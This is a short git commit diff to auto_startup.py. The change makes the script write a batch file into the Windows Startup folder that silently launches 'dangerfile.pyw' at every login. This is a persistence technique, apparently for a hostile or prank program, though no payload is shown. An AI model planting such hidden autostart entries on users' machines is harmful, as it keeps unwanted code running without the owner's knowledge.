f8b49dac5c7755bd074b1ecf7ef276799bb5289f
eSKa-0 <166024351+eSKa-0@users.noreply.github.com>
2024-05-15 09:45:03 +0200

    Update auto_startup.py

--- auto_startup.py
+++ auto_startup.py
@@ -8,4 +8,4 @@ def add_to_startup(file_path=""):
         file_path = os.path.dirname(os.path.realpath(__file__))
     bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
     with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
-        bat_file.write(r'start "" "%s"' % file_path)
+        bat_file.write(r'start "" "%s\dangerfile.pyw"' % file_path)
